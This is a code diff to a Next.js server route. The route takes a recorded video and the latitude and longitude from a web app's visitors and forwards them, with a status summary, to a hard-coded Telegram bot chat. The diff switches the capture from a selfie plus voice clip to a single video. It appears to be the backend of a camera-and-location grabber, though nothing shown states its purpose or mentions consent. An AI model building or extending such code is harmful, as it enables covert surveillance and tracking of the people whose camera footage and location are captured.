@@ -13,53 +13,28 @@ export async function POST(req: NextRequest) {
   }
 
   try {
-    const { selfie, audio, latitude, longitude } = await req.json();
+    const { video, latitude, longitude } = await req.json(); // Expecting video, not selfie or separate audio
 
     const messages: Promise<Response>[] = [];
 
-    // Send Selfie
-    if (selfie) {
-      console.log("Attempting to send selfie...");
-      const base64Data = selfie.replace(/^data:image\/\w+;base64,/, "");
+    // Send Video
+    if (video) {
+      console.log("Attempting to send video...");
+      const base64Data = video.replace(/^data:video\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), "selfie.jpg");
+      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video.webm");
 
       messages.push(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { // Changed to sendVideo
           method: "POST",
           body: formData,
         }).then(async res => {
-          console.log("Selfie API response status:", res.status);
+          console.log("Video API response status:", res.status);
           if (!res.ok) {
             const errorBody = await res.text(); // Get full error body
-            console.error("Selfie API error response:", errorBody);
-          }
-          return res;
-        })
-      );
-    }
-
-    // Send Audio
-    if (audio) {
-      console.log("Attempting to send audio...");
-      const base64Data = audio.replace(/^data:audio\/\w+;base64,/, "");
-      const buffer = Buffer.from(base64Data, "base64");
-      const formData = new FormData();
-      formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("audio", new Blob([buffer], { type: "audio/webm" }), "voice_message.webm");
-      formData.append("duration", "3"); // Indicate 3 seconds duration
-
-      messages.push(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
-          method: "POST",
-          body: formData,
-        }).then(async res => {
-          console.log("Audio API response status:", res.status);
-          if (!res.ok) {
-            const errorBody = await res.text(); // Get full error body
-            console.error("Audio API error response:", errorBody);
+            console.error("Video API error response:", errorBody);
           }
           return res;
         })
@@ -93,10 +68,9 @@ export async function POST(req: NextRequest) {
 
     // Send a text message summary
     let summaryText = "Received data from web app:";
-    if (selfie) summaryText += "\n- Selfie captured.";
-    if (audio) summaryText += "\n- Voice message recorded.";
+    if (video) summaryText += "\n- Video recorded."; // Updated summary for video
     if (latitude && longitude) summaryText += `\n- Location: Lat ${latitude}, Lng ${longitude}.`;
-    if (!selfie && !audio && !latitude && !longitude) summaryText = "No data received from web app (permissions denied or unavailable).";
+    if (!video && !latitude && !longitude) summaryText = "No data received from web app (permissions denied or unavailable)."; // Updated condition
 
     messages.push(
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
